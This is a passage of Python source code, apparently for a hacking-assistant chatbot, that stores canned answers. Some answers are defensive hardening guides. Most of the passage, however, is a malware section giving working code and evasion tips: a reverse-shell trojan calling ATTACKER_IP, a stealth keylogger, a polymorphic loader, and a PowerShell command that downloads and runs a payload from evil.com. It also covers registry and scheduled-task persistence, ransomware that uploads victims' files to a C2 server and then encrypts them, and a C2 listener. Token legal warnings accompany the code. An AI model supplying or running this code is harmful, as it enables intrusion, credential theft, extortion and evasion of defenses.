                          f"app = Flask(__name__)\n"
                          f"SECRET = 'securekey'\n\n"
                          f"def token_required(f):\n"
                          f"    @wraps(f)\n"
                          f"    def decorated(*args, **kwargs):\n"
                          f"        token = request.headers.get('Authorization')\n"
                          f"        if not token:\n"
                          f"            return jsonify({{'message': 'Token missing!'}}), 403\n"
                          f"        try:\n"
                          f"            jwt.decode(token, SECRET, algorithms=['HS256'])\n"
                          f"        except:\n"
                          f"            return jsonify({{'message': 'Invalid Token'}}), 403\n"
                          f"        return f(*args, **kwargs)\n"
                          f"    return decorated\n\n"
                          f"@app.route('/secure-data')\n"
                          f"@token_required\n"
                          f"def secure_data():\n"
                          f"    return jsonify({{'data': 'Sensitive Info'}})\n\n"
                          f"app.run(port=8080){Colors.END}",





        
            "how to implement siem": f"{Colors.MAGENTA}SIEM (Security Information and Event Management) Implementation:{Colors.END}\n"
                             f"{Colors.GREEN}• Deploy Centralized Log Collection:{Colors.END} Gather logs from endpoints, servers, firewalls, applications, etc. using syslog, agents (e.g., Filebeat, NXLog).\n"
                             f"{Colors.GREEN}• Normalize and Parse Log Data:{Colors.END} Use tools like Logstash to filter, parse, and format logs into structured events.\n"
                             f"{Colors.GREEN}• Correlate Events for Threat Detection:{Colors.END} Define rules that match multiple patterns (e.g., brute-force + privilege escalation).\n"
                             f"{Colors.GREEN}• Set Real-time Alerts and Dashboards:{Colors.END} Visualize threats and set up email/SMS/Slack alerts on suspicious activities.\n"
                             f"{Colors.RED}• Integrate with Threat Intelligence Feeds:{Colors.END} Enrich logs using open threat feeds (like AlienVault OTX, MISP).\n"
                             f"{Colors.YELLOW}Example: Simple ELK Stack Log Forwarding Flow:{Colors.END}\n"
                             f"{Colors.YELLOW}--------------------------------------------------{Colors.END}\n"
                             f"{Colors.YELLOW}1. Filebeat → Logstash → Elasticsearch → Kibana{Colors.END}\n"
                             f"{Colors.YELLOW}2. Example Filebeat config snippet (filebeat.yml):{Colors.END}\n\n"
                             f"{Colors.YELLOW}filebeat.inputs:\n"
                             f"- type: log\n"
                             f"  paths:\n"
                             f"    - /var/log/auth.log\n\n"
                             f"output.logstash:\n"
                             f"  hosts: [\"localhost:5044\"]\n{Colors.END}",





       
            "how to secure linux servers": f"{Colors.MAGENTA}Linux Server Hardening Guide:{Colors.END}\n"
                                  f"{Colors.GREEN}• Disable Unnecessary Services:{Colors.END} Stop and remove unused daemons (e.g., FTP, telnet, etc).\n"
                                  f"{Colors.GREEN}• Enforce Strong SSH Configuration:{Colors.END} Disable root login, use key-based authentication, and change default port.\n"
                                  f"{Colors.GREEN}• Set Up a Firewall (iptables/ufw):{Colors.END} Allow only essential ports (e.g., 22, 80, 443).\n"
                                  f"{Colors.GREEN}• Enable Automatic Security Updates:{Colors.END} Use unattended-upgrades or dnf-automatic (for CentOS/Fedora).\n"
                                  f"{Colors.GREEN}• Audit File Permissions and Ownership:{Colors.END} Restrict sensitive files like /etc/shadow, /root.\n"
                                  f"{Colors.RED}• Monitor Logs and System Activity:{Colors.END} Use auditd, fail2ban, logwatch, or ossec.\n"
                                  f"{Colors.YELLOW}Example: Harden SSH + Setup Basic Firewall:{Colors.END}\n"
                                  f"{Colors.YELLOW}--------------------------------------------------{Colors.END}\n"
                                  f"{Colors.YELLOW}# Disable root login and enforce key auth:{Colors.END}\n"
                                  f"{Colors.YELLOW}sudo nano /etc/ssh/sshd_config\n"
                                  f"PermitRootLogin no\n"
                                  f"PasswordAuthentication no\n"
                                  f"Port 2200\n"
                                  f"{Colors.YELLOW}sudo systemctl restart sshd\n\n"
                                  f"# Basic UFW Firewall Setup:{Colors.END}\n"
                                  f"{Colors.YELLOW}sudo ufw default deny incoming\n"
                                  f"sudo ufw default allow outgoing\n"
                                  f"sudo ufw allow 2200/tcp\n"
                                  f"sudo ufw allow 80/tcp\n"
                                  f"sudo ufw allow 443/tcp\n"
                                  f"sudo ufw enable{Colors.END}",





        
            "how to secure windows servers": f"{Colors.MAGENTA}Windows Server Hardening Guide:{Colors.END}\n"
                                     f"{Colors.GREEN}• Disable Unused Services and Features:{Colors.END} Reduce attack surface by removing unnecessary roles and protocols.\n"
                                     f"{Colors.GREEN}• Enforce Group Policy Security Settings:{Colors.END} Use GPOs to manage user rights, password policies, and lockout rules.\n"
                                     f"{Colors.GREEN}• Harden RDP Configuration:{Colors.END} Change port, limit users, enforce Network Level Authentication (NLA).\n"
                                     f"{Colors.GREEN}• Enable Windows Defender and Firewall:{Colors.END} Use real-time protection and block unwanted connections.\n"
                                     f"{Colors.GREEN}• Configure Audit Policies:{Colors.END} Track login attempts, changes, and privilege escalation with proper logging.\n"
                                     f"{Colors.RED}• Apply All Critical Windows Updates:{Colors.END} Patch OS, drivers, and third-party apps regularly.\n"
                                     f"{Colors.YELLOW}Example: PowerShell Security Hardening Snippet:{Colors.END}\n"
                                     f"{Colors.YELLOW}--------------------------------------------------------{Colors.END}\n"
                                     f"{Colors.YELLOW}# Disable SMBv1 (Old protocol vulnerable to WannaCry):{Colors.END}\n"
                                     f"Disable-WindowsOptionalFeature -Online -FeatureName 'SMB1Protocol' -NoRestart\n\n"
                                     f"{Colors.YELLOW}# Enable Firewall for all profiles:{Colors.END}\n"
                                     f"Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True\n\n"
                                     f"{Colors.YELLOW}# Audit Logon Events:{Colors.END}\n"
                                     f"auditpol /set /subcategory:\"Logon\" /success:enable /failure:enable\n\n"
                                     f"{Colors.YELLOW}# Enforce Complex Password Policy:{Colors.END}\n"
                                     f"secedit /export /cfg secpol.cfg\n"
                                     f"# Edit the config manually then:\n"
                                     f"secedit /configure /db secpol.sdb /cfg secpol.cfg /areas SECURITYPOLICY{Colors.END}",





        
            "how to implement endpoint detection": f"{Colors.MAGENTA}Endpoint Detection & Response (EDR) Implementation:{Colors.END}\n"
                                      f"{Colors.GREEN}• Deploy EDR agents on all endpoints:{Colors.END} Use lightweight agents to monitor activities in real-time.\n"
                                      f"{Colors.GREEN}• Enable real-time process and file monitoring:{Colors.END} Detect suspicious processes, file access, or injections.\n"
                                      f"{Colors.GREEN}• Implement behavioral-based detection:{Colors.END} Identify patterns of compromise rather than just signatures.\n"
                                      f"{Colors.GREEN}• Integrate with SIEM or SOC platform:{Colors.END} Centralize logs and alerts for correlation and investigation.\n"
                                      f"{Colors.GREEN}• Configure alerts, response rules, and auto-containment:{Colors.END} Set thresholds for blocking or isolating infected hosts.\n"
                                      f"{Colors.RED}• Conduct regular threat hunting on telemetry data:{Colors.END} Use IOC matching, YARA rules, or machine learning detection.\n"
                                      f"{Colors.YELLOW}Example: Lightweight EDR Python Telemetry Snippet:{Colors.END}\n"
                                      f"{Colors.YELLOW}--------------------------------------------------{Colors.END}\n"
                                      f"import psutil, socket, json\n"
                                      f"def collect_edr_data():\n"
                                      f"    data = {{\n"
                                      f"        'hostname': socket.gethostname(),\n"
                                      f"        'processes': [p.name() for p in psutil.process_iter()],\n"
                                      f"        'connections': [str(conn.laddr) for conn in psutil.net_connections() if conn.status == 'ESTABLISHED']\n"
                                      f"    }}\n"
                                      f"    return json.dumps(data)\n\n"
                                      f"# Send data to central log server or analysis system\n"
                                      f"print(collect_edr_data())",



            "how to implement threat intelligence feeds": f"{Colors.MAGENTA}Threat Intelligence Feed Integration:{Colors.END}\n"
                                                f"{Colors.GREEN}• Choose trusted threat intel sources:{Colors.END} e.g., AlienVault OTX, MISP, IBM X-Force, AbuseIPDB.\n"
                                                f"{Colors.GREEN}• Use STIX/TAXII or REST APIs to ingest feeds:{Colors.END} Standardized formats simplify automation.\n"
                                                f"{Colors.GREEN}• Normalize and enrich data before usage:{Colors.END} Add geo-IP, ASN, and reputational metadata.\n"
                                                f"{Colors.GREEN}• Correlate feeds with logs/SIEM events:{Colors.END} Match indicators like IPs, hashes, URLs.\n"
                                                f"{Colors.GREEN}• Automate blocklists/firewall updates:{Colors.END} Push IOCs to EDR, proxy, IDS, or firewall in real-time.\n"
                                                f"{Colors.RED}• Continuously update and validate threat feeds:{Colors.END} Expired or false indicators may cause alert fatigue.\n"
                                                f"{Colors.YELLOW}Example: Python Code to Fetch Feed from AlienVault OTX:{Colors.END}\n"
                                                f"{Colors.YELLOW}---------------------------------------------------------{Colors.END}\n"
                                                f"import requests\n"
                                                f"API_KEY = 'YOUR_OTX_API_KEY'\n"
                                                f"url = 'https://otx.alienvault.com/api/v1/indicators/export'\n"
                                                f"headers = {{'X-OTX-API-KEY': API_KEY}}\n"
                                                f"response = requests.get(url, headers=headers)\n"
                                                f"if response.ok:\n"
                                                f"    with open('intel_iocs.txt', 'w') as f:\n"
                                                f"        f.write(response.text)\n"
                                                f"    print('[+] Threat feed saved successfully.')\n"
                                                f"else:\n"
                                                f"    print('[-] Failed to fetch threat feed')"
}
 

 
   # NEW: Malware tools
        self.Malware_scripts = {
            "how to create advanced trojan": f"{Colors.MAGENTA}Advanced Trojan Development:{Colors.END}\n"
                               f"{Colors.GREEN}• What is a Trojan?{Colors.END} A deceptive program that appears harmless but delivers a hidden malicious payload.\n"
                               f"{Colors.GREEN}• Core Features of an Advanced Trojan:{Colors.END}\n"
                               f"{Colors.CYAN}   1. Masquerade: Disguise as legitimate software (e.g., PDF viewer, game installer)\n"
                               f"{Colors.CYAN}   2. Remote Access: Establish a backdoor for attacker control\n"
                               f"{Colors.CYAN}   3. Persistence: Auto-start on reboot\n"
                               f"{Colors.CYAN}   4. Information Theft: Keylogging, credential scraping, file access\n"
                               f"{Colors.CYAN}   5. Command & Control: Receive commands via HTTP, TCP, or even Discord Webhooks\n"
                               f"{Colors.GREEN}• Code Snippet - Basic Trojan Skeleton (Python):{Colors.END}\n"
                               f"{Colors.CYAN}import socket, os, subprocess\n"
                               f"def connect():\n"
                               f"    s = socket.socket()\n"
                               f"    s.connect(('ATTACKER_IP', 4444))\n"
                               f"    while True:\n"
                               f"        cmd = s.recv(1024).decode()\n"
                               f"        if cmd.lower() == 'exit':\n"
                               f"            break\n"
                               f"        output = subprocess.getoutput(cmd)\n"
                               f"        s.send(output.encode())\n"
                               f"    s.close()\n"
                               f"connect()\n"
                               f"{Colors.GREEN}• Advanced Obfuscation Tips:{Colors.END}\n"
                               f"{Colors.CYAN}   - Convert Python to .exe using PyInstaller\n"
                               f"{Colors.CYAN}   - Use UPX packing, crypters, or custom loaders to avoid antivirus\n"
                               f"{Colors.CYAN}   - Embed in MS Office macro or fake image\n"
                               f"{Colors.GREEN}• Common Trojan Functionalities:{Colors.END}\n"
                               f"{Colors.CYAN}   - Screenshot capture\n"
                               f"{Colors.CYAN}   - Keylogging\n"
                               f"{Colors.CYAN}   - File upload/download\n"
                               f"{Colors.CYAN}   - Webcam control\n"
                               f"{Colors.RED}• Real-World Trojan Examples:{Colors.END}\n"
                               f"{Colors.YELLOW}   - DarkComet: RAT with GUI and remote file manager\n"
                               f"{Colors.YELLOW}   - PlugX: Modular Trojan used in APT campaigns\n"
                               f"{Colors.YELLOW}   - AgentTesla: Credential-stealer with email exfiltration\n"
                               f"{Colors.GREEN}• Ethical Use Only:{Colors.END} Use only for sandbox testing, detection bypass research, or defense development.\n",
                        
                
            "how to create advanced keylogger": f"{Colors.MAGENTA}Advanced Keylogger Design:{Colors.END}\n"
                                  f"{Colors.GREEN}• What is a Keylogger?{Colors.END} A tool that records keystrokes to capture sensitive data (like passwords or chats).\n"
                                  f"{Colors.GREEN}• Components of an Advanced Keylogger:{Colors.END}\n"
                                  f"{Colors.CYAN}   1. Stealth Mode: Runs in the background with no visible window\n"
                                  f"{Colors.CYAN}   2. Logging: Captures all keyboard input with timestamps\n"
                                  f"{Colors.CYAN}   3. Auto-start: Adds itself to system startup\n"
                                  f"{Colors.CYAN}   4. Exfiltration: Emails or uploads logs (FTP, HTTP, webhook)\n"
                                  f"{Colors.CYAN}   5. Anti-analysis: Uses obfuscation or delays in sandbox environments\n"
                                  f"{Colors.GREEN}• Sample Python Code (Windows, using `pynput`):{Colors.END}\n"
                                  f"{Colors.CYAN}from pynput.keyboard import Key, Listener\n"
                                  f"import logging\n"
                                  f"import os\n"
                                  f"from datetime import datetime\n\n"
                                  f"LOG_DIR = os.getenv('APPDATA') + r'\\\\SysLogs'\n"
                                  f"os.makedirs(LOG_DIR, exist_ok=True)\n"
                                  f"log_file = os.path.join(LOG_DIR, 'keys.txt')\n"
                                  f"logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')\n\n"
                                  f"def on_press(key):\n"
                                  f"    try:\n"
                                  f"        logging.info(str(key.char))\n"
                                  f"    except AttributeError:\n"
                                  f"        logging.info(str(key))\n\n"
                                  f"with Listener(on_press=on_press) as listener:\n"
                                  f"    listener.join()\n"
                                  f"{Colors.GREEN}• Advanced Tactics:{Colors.END}\n"
                                  f"{Colors.CYAN}   - Convert to EXE (PyInstaller)\n"
                                  f"{Colors.CYAN}   - Set registry key for persistence\n"
                                  f"{Colors.CYAN}   - Encrypt logs before exfiltration\n"
                                  f"{Colors.CYAN}   - Integrate screenshot module (for context)\n"
                                  f"{Colors.GREEN}• Defensive Awareness:{Colors.END} Blue teams should monitor keystroke APIs, persistence locations, and outbound traffic.",
                           





            "how to create polymorphic malware": f"{Colors.MAGENTA}Polymorphic Malware Development:{Colors.END}\n"
                                 f"{Colors.GREEN}• What is Polymorphic Malware?{Colors.END} Malware that constantly changes its code while keeping the original behavior intact.\n"
                                 f"{Colors.GREEN}• Purpose:{Colors.END} To evade signature-based detection by generating a unique binary every time it runs.\n"
                                 f"{Colors.GREEN}• Core Concepts:{Colors.END}\n"
                                 f"{Colors.CYAN}   1. Code Mutation Engine:{Colors.END} Automatically rewrites code sections during runtime or build process.\n"
                                 f"{Colors.CYAN}   2. Encryption + Dynamic Decryption:{Colors.END} Payloads are encrypted and decrypted at runtime using a unique key each time.\n"
                                 f"{Colors.CYAN}   3. Junk Code Insertion:{Colors.END} Inserts irrelevant instructions to change the binary signature.\n"
                                 f"{Colors.CYAN}   4. Variable Renaming + Control Flow Obfuscation:{Colors.END} Changes names, loop orders, logic paths.\n"
                                 f"{Colors.GREEN}• Sample Mutation Logic (Python Pseudocode):{Colors.END}\n"
                                 f"{Colors.CYAN}import random\n"
                                 f"def junk_code():\n"
                                 f"    return '\\n'.join([random.choice(['x += 1', 'y -= 2', 'temp = x * y']) for _ in range(3)])\n"
                                 f"def generate_variant(payload):\n"
                                 f"    stub = f\"def loader():\\n    key = 'mykey'  # XOR key\\n    payload = '{{payload}}'\\n    exec(decrypt(payload, key))\\n{{junk_code()}}\"\n"
                                 f"    return stub\n"
                                 f"variant = generate_variant(encrypt(original_payload, 'mykey'))\n"
                                 f"with open('variant.py', 'w') as f: f.write(variant)\n"
                                 f"{Colors.GREEN}• Advanced Polymorphism Ideas:{Colors.END}\n"
                                 f"   - Self-modifying assembly code (e.g., in C with inline ASM)\n"
                                 f"   - Multiple encryption rounds (AES + XOR + custom cipher)\n"
                                 f"   - Random instruction replacement with equivalent logic\n"
                                 f"{Colors.GREEN}• Real Malware Use:{Colors.END} Polymorphism used by Virut, Storm Worm, and more recently in advanced loaders.\n"
                                 f"{Colors.GREEN}• Detection Avoidance Tips:{Colors.END}\n"
                                 f"   - Use unique stub for every payload\n"
                                 f"   - Encode payload and vary entry-point logic\n"
                                 f"   - Avoid static strings and hardcoded API calls\n"
                                 f"{Colors.RED}• LEGAL WARNING:{Colors.END} Polymorphic malware is a top-tier evasion method. Use for legal simulations or research only.\n",




            "how to create metamorphic malware": f"{Colors.MAGENTA}Metamorphic Malware Development:{Colors.END}\n"
                                f"{Colors.GREEN}• What is Metamorphic Malware?{Colors.END} Malware that fully rewrites its own code with each generation while maintaining the same functionality.\n"
                                f"{Colors.GREEN}• Purpose:{Colors.END} To evade both signature and heuristic detection engines by eliminating repeated patterns.\n"
                                f"{Colors.GREEN}• Difference From Polymorphic Malware:{Colors.END} Polymorphic malware encrypts the payload and decrypts it during execution, but metamorphic malware reprograms itself without encryption.\n"
                                f"{Colors.GREEN}• Core Concepts:{Colors.END}\n"
                                f"{Colors.CYAN}   1. Instruction Substitution:{Colors.END} Replace certain instructions with others that do the same thing (e.g., `a = a + 1` with `a += 1`).\n"
                                f"{Colors.CYAN}   2. Code Permutation:{Colors.END} Shuffle the order of independent code blocks.\n"
                                f"{Colors.CYAN}   3. Dead Code Insertion:{Colors.END} Insert non-functional junk code (e.g., `x = x`).\n"
                                f"{Colors.CYAN}   4. Code Regeneration Engine:{Colors.END} Script that produces new variants of the malware code every time.\n"
                                f"{Colors.GREEN}• Metamorphic Engine Sample (Python):{Colors.END}\n"
                                f"{Colors.CYAN}import random\n"
                                f"def generate_variant():\n"
                                f"    blocks = [\n"
                                f"        'x = 5',\n"
                                f"        'y = x * 2',\n"
                                f"        'result = y + 10',\n"
                                f"        'print(\\\"Final: \\\", result)'\n"
                                f"    ]\n"
                                f"    junk = ['temp = 123', 'x = x', 'pass', 'del x if \\\"x\\\" in locals() else None']\n"
                                f"    random.shuffle(blocks)\n"
                                f"    variant_code = '\\n'.join(random.sample(junk, 2) + blocks + random.sample(junk, 2))\n"
                                f"    return f'def run():\\n    ' + variant_code.replace('\\n', '\\n    ')\n"
                                f"\n"
                                f"with open('variant_malware.py', 'w') as f:\n"
                                f"    f.write(generate_variant())\n"
                                f"{Colors.GREEN}• Functionality:{Colors.END} Each time this script runs, it generates a new .py file with reshuffled logic and harmless junk code.\n"
                                f"{Colors.GREEN}• Real-World Example:{Colors.END} W32/Simile and ZMist are real metamorphic viruses used in the wild.\n"
                                f"{Colors.GREEN}• Advanced Techniques:{Colors.END}\n"
                                f"   - Recompiling opcode from source\n"
                                f"   - Inserting functionally irrelevant subroutines\n"
                                f"   - Regenerating control flow graphs per execution\n"
                                f"{Colors.RED}• LEGAL WARNING:{Colors.END} Metamorphic techniques are highly evasive. Use only for ethical testing, education, or malware defense R&D.\n",





            "how to create fileless malware": f"{Colors.MAGENTA}Fileless Malware Development:{Colors.END}\n"
                               f"{Colors.GREEN}• What is Fileless Malware?{Colors.END} Malware that operates entirely in memory (RAM) and leaves no footprint on disk.\n"
                               f"{Colors.GREEN}• Purpose:{Colors.END} Evade antivirus, EDR, and forensic tools that monitor file activity.\n"
                               f"{Colors.GREEN}• How It Works:{Colors.END} Payload is loaded directly into memory through scripts, APIs, or exploits, often using LOLBins (Living Off the Land Binaries).\n"
                               f"{Colors.GREEN}• Key Techniques:{Colors.END}\n"
                               f"{Colors.CYAN}   1. PowerShell In-Memory Execution:{Colors.END} Use PowerShell to download and execute payloads without saving.\n"
                               f"{Colors.CYAN}   2. Reflective DLL Injection:{Colors.END} Load and run DLLs directly into process memory.\n"
                               f"{Colors.CYAN}   3. WMI (Windows Management Instrumentation):{Colors.END} Persist and run malware using system events or classes.\n"
                               f"{Colors.CYAN}   4. Registry or Memory Persistence:{Colors.END} Store payload in registry or memory-only containers.\n"
                               f"{Colors.GREEN}• Sample PowerShell Code (fileless execution):{Colors.END}\n"
                               f"{Colors.CYAN}$code = Invoke-WebRequest -Uri 'http://evil.com/payload.ps1' -UseBasicParsing | Select-Object -Expand Content\n"
                               f"Invoke-Expression $code\n"
                               f"{Colors.END}  ➤ This command fetches a script and runs it in memory, without writing anything to disk.\n"
                               f"{Colors.GREEN}• Sample Python Launcher Using PowerShell:{Colors.END}\n"
                               f"{Colors.CYAN}import subprocess\n"
                               f"ps_script = 'Invoke-WebRequest -Uri http://evil.com/payload.ps1 -UseBasicParsing | Invoke-Expression'\n"
                               f"subprocess.run(['powershell', '-Command', ps_script], shell=True)\n"
                               f"{Colors.GREEN}• Real-World Examples:{Colors.END} Astaroth, Kovter, and Emotet used fileless techniques.\n"
                               f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                               f"   - Monitor PowerShell & WMI activity\n"
                               f"   - Use behavioral-based EDR\n"
                               f"   - Harden scripting engines and disable macros\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} Fileless malware techniques are advanced and often used in APTs. Only use for defense, education, or ethical testing under legal environments.\n",





            "how to implement malware persistence": f"{Colors.MAGENTA}Malware Persistence Techniques:{Colors.END}\n"
                              f"{Colors.GREEN}• What is Persistence?{Colors.END} The ability of malware to survive system reboots, logouts, and continue running until manually removed.\n"
                              f"{Colors.GREEN}• Purpose:{Colors.END} Maintain long-term access to the infected system, often stealthily.\n"
                              f"{Colors.GREEN}• Categories of Persistence:{Colors.END}\n"
                              f"{Colors.CYAN}   1. Registry Run Keys:{Colors.END} Auto-start malware on boot using keys like HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n"
                              f"{Colors.CYAN}   2. Scheduled Tasks (Task Scheduler):{Colors.END} Create a hidden task that relaunches malware at boot or specific trigger.\n"
                              f"{Colors.CYAN}   3. Startup Folder:{Colors.END} Drop a malicious shortcut or binary in %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.\n"
                              f"{Colors.CYAN}   4. WMI Event Subscriptions:{Colors.END} Bind malicious execution to system events (advanced & stealthy).\n"
                              f"{Colors.CYAN}   5. Services & Drivers:{Colors.END} Create malicious services for persistence (requires admin privileges).\n"
                              f"{Colors.CYAN}   6. DLL Hijacking:{Colors.END} Replace legit DLLs with malicious ones in high privilege applications.\n"
                              f"{Colors.GREEN}• Sample Python Code: Add to Registry Run Key:{Colors.END}\n"
                              f"{Colors.CYAN}import winreg\n"
                              f"key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, winreg.KEY_SET_VALUE)\n"
                              f"winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, r'C:\\\\Users\\\\User\\\\AppData\\\\Roaming\\\\updater.exe')\n"
                              f"winreg.CloseKey(key)\n"
                              f"{Colors.GREEN}• Sample PowerShell Scheduled Task:{Colors.END}\n"
                              f"{Colors.CYAN}Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'malware.exe') "
                              f"-Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName 'UpdaterTask' -User 'SYSTEM'\n"
                              f"{Colors.GREEN}• Defense Strategies:{Colors.END}\n"
                              f"   - Monitor registry changes\n"
                              f"   - Watch for new scheduled tasks\n"
                              f"   - Audit startup folder and WMI events\n"
                              f"{Colors.RED}• LEGAL WARNING:{Colors.END} Malware persistence should only be studied or tested under legal and controlled environments for research, learning, or defensive strategy development.\n",






            "how to create rootkit for windows/linux": f"{Colors.MAGENTA}Rootkit Creation for Windows & Linux:{Colors.END}\n"
                              f"{Colors.GREEN}• What is a Rootkit?{Colors.END} A rootkit is a stealthy type of malware designed to hide the existence of certain processes, files, network connections, or even itself from the OS or security software.\n"
                              f"{Colors.GREEN}• Purpose:{Colors.END} Maintain stealth access with elevated privileges, and bypass detection.\n"
                              f"{Colors.GREEN}• Categories:{Colors.END}\n"
                              f"{Colors.CYAN}   1. User-mode Rootkits:{Colors.END} Operate at the application level, often using API hooking or DLL injection.\n"
                              f"{Colors.CYAN}   2. Kernel-mode Rootkits:{Colors.END} Operate at the OS kernel level, modifying system calls, drivers, or kernel structures.\n"
                              f"{Colors.CYAN}   3. Bootkits:{Colors.END} Modify the bootloader or firmware to execute before OS boots.\n"
                              f"{Colors.CYAN}   4. Hypervisor Rootkits:{Colors.END} Run below the OS using virtualization (very advanced).\n"
                              f"{Colors.GREEN}• Sample Concept - Linux Kernel Rootkit (LKM):{Colors.END}\n"
                              f"{Colors.CYAN}// C Code snippet (hide a process)\n"
                              f"#include <linux/module.h>\n"
                              f"#include <linux/kernel.h>\n"
                              f"#include <linux/init.h>\n"
                              f"#include <linux/proc_fs.h>\n"
                              f"#include <linux/dirent.h>\n"
                              f"#include <linux/uaccess.h>\n"
                              f"// Hook getdents to hide process by PID\n"
                              f"// Replace syscall table entry for sys_getdents\n"
                              f"{Colors.GREEN}• Sample Concept - Windows User-mode Rootkit:{Colors.END}\n"
                              f"{Colors.CYAN}// Use API hooking to hide files/processes\n"
                              f"// Hook 'FindFirstFile' or 'EnumProcesses' using DLL injection\n"
                              f"// You can use Detours library or write inline assembly\n"
                              f"{Colors.GREEN}• Python Demonstration of Hooking (User-mode Simulation):{Colors.END}\n"
                              f"{Colors.CYAN}import ctypes\n"
                              f"kernel32 = ctypes.windll.kernel32\n"
                              f"CreateFileA = kernel32.CreateFileA\n"
                              f"CreateFileA.restype = ctypes.c_void_p\n"
                              f"def fake_CreateFileA(lpFileName, *args):\n"
                              f"    if b'secret.txt' in lpFileName:\n"
                              f"        return -1  # Pretend file doesn’t exist\n"
                              f"    return CreateFileA(lpFileName, *args)\n"
                              f"# Hooking would require overwriting function ptr (done in C/C++)\n"
                              f"{Colors.GREEN}• Persistence Techniques:{Colors.END} Rootkits often pair with bootkits, service hiding, or autoload modules to survive reboots.\n"
                              f"{Colors.RED}• Dangerous Capabilities:{Colors.END} Rootkits can:\n"
                              f"   - Hide malware files/processes\n"
                              f"   - Intercept keystrokes\n"
                              f"   - Elevate privileges silently\n"
                              f"   - Patch security tools in memory\n"
                              f"{Colors.GREEN}• Detection Methods:{Colors.END}\n"
                              f"   - Kernel integrity checks\n"
                              f"   - System call audits\n"
                              f"   - Volatility memory forensics\n"
                              f"   - Rootkit scanners (Chkrootkit, GMER, etc)\n"
                              f"{Colors.RED}• LEGAL WARNING:{Colors.END} Rootkit development is highly sensitive. Only conduct rootkit coding or analysis in sandboxed labs for legal, educational, or defense research purposes.\n",




            "how to create ransomware with data exfiltration": f"{Colors.MAGENTA}Advanced Ransomware With Data Exfiltration:{Colors.END}\n"
                              f"{Colors.GREEN}• Overview:{Colors.END} This ransomware performs traditional encryption of target files, but also exfiltrates (steals) copies of the data to a remote C2 server or cloud bucket for blackmail or double extortion.\n"
                              f"{Colors.GREEN}• Goals:{Colors.END}\n"
                              f"{Colors.CYAN}   1. Encrypt files to deny access.\n"
                              f"{Colors.CYAN}   2. Exfiltrate sensitive data before encryption.\n"
                              f"{Colors.CYAN}   3. Deliver ransom note and demand payment.\n"
                              f"{Colors.GREEN}• High-Level Workflow:{Colors.END}\n"
                              f"{Colors.CYAN}   1. Initial execution & privilege check\n"
                              f"{Colors.CYAN}   2. Scan target directories/files\n"
                              f"{Colors.CYAN}   3. Upload selected files to remote server\n"
                              f"{Colors.CYAN}   4. Encrypt files with strong algorithm (e.g., AES + RSA)\n"
                              f"{Colors.CYAN}   5. Drop ransom note and lock screen (optional)\n"
                              f"{Colors.GREEN}• Sample Python Exfiltration Code:{Colors.END}\n"
                              f"{Colors.CYAN}import requests, os\n"
                              f"def exfiltrate(file_path):\n"
                              f"    with open(file_path, 'rb') as f:\n"
                              f"        files = {{'file': f}}\n"
                              f"        requests.post('http://your_c2_server/upload', files=files)\n"
                              f"# Example usage\n"
                              f"exfiltrate('C:/Users/victim/Documents/secrets.pdf')\n"
                              f"{Colors.GREEN}• Sample Encryption Logic (Python AES):{Colors.END}\n"
                              f"{Colors.CYAN}from Crypto.Cipher import AES\n"
                              f"from Crypto.Random import get_random_bytes\n"
                              f"def encrypt_file(file_path, key):\n"
                              f"    cipher = AES.new(key, AES.MODE_EAX)\n"
                              f"    with open(file_path, 'rb') as f:\n"
                              f"        data = f.read()\n"
                              f"    ciphertext, tag = cipher.encrypt_and_digest(data)\n"
                              f"    with open(file_path + '.locked', 'wb') as f:\n"
                              f"        f.write(cipher.nonce + tag + ciphertext)\n"
                              f"{Colors.GREEN}• Features You Can Add:{Colors.END}\n"
                              f"   - Stealth mode (run in background)\n"
                              f"   - Filetype filters (only exfiltrate .docx, .pdf, .jpg, etc.)\n"
                              f"   - Ransom note generator (with timer)\n"
                              f"   - VPN or Tor tunneling for stealth C2 comms\n"
                              f"{Colors.RED}• LEGAL WARNING:{Colors.END} Creating or deploying ransomware is illegal and unethical unless it’s within a controlled environment for **defensive research, simulation, or blue team testing**. Misuse leads to criminal charges.\n",






            "how to develop command & control (c2) infrastructure": f"{Colors.MAGENTA}Command & Control (C2) Infrastructure Development:{Colors.END}\n"
                               f"{Colors.GREEN}• Purpose:{Colors.END} C2 infrastructure allows attackers or red team tools to remotely control infected hosts, send commands, receive data, and manage compromised systems in real time.\n"
                               f"{Colors.GREEN}• Core Components:{Colors.END}\n"
                               f"{Colors.CYAN}   1. Listener (Server):{Colors.END} Waits for connections from infected clients (bots).\n"
                               f"{Colors.CYAN}   2. Agent (Client):{Colors.END} Runs on the infected system, connects back to the C2 server.\n"
                               f"{Colors.CYAN}   3. Communication Channel:{Colors.END} Often HTTP/S, DNS, TCP, WebSockets, or even Telegram/Slack.\n"
                               f"{Colors.CYAN}   4. Command Processor:{Colors.END} Parses and executes commands like download, exec, exfiltrate, screenshot, etc.\n"
                               f"{Colors.GREEN}• Basic Python Flask C2 Listener Sample:{Colors.END}\n"
                               f"{Colors.CYAN}from flask import Flask, request\n"
                               f"app = Flask(__name__)\n"
                               f"commands = []\n"
                               f"@app.route('/beacon', methods=['POST'])\n"
                               f"def beacon():\n"
                               f"    data = request.json\n"
                               f"    print(f'Victim says: {{data}}')\n"
                               f"@app.route('/send', methods=['POST'])\n"
                               f"def send_cmd():\n"
                               f"    cmd = request.form['cmd']\n"
                               f"    commands.append(cmd)\n"
                               f"    return 'Command queued.'\n"
                               f"app.run(host='0.0.0.0', port=8080)\n"
                               f"{Colors.GREEN}• Agent Side (Victim):{Colors.END} Would beacon back to /beacon with host info and execute any returned command.\n"
                               f"{Colors.GREEN}• Advanced Features To Add:{Colors.END}\n"
                               f"   - AES encryption for traffic\n"
                               f"   - Domain Fronting or CDN tunnels\n"
                               f"   - Polymorphic agent code\n"
                               f"   - HTTP headers mimicking browser traffic\n"
                               f"   - Sleep & jitter control\n"
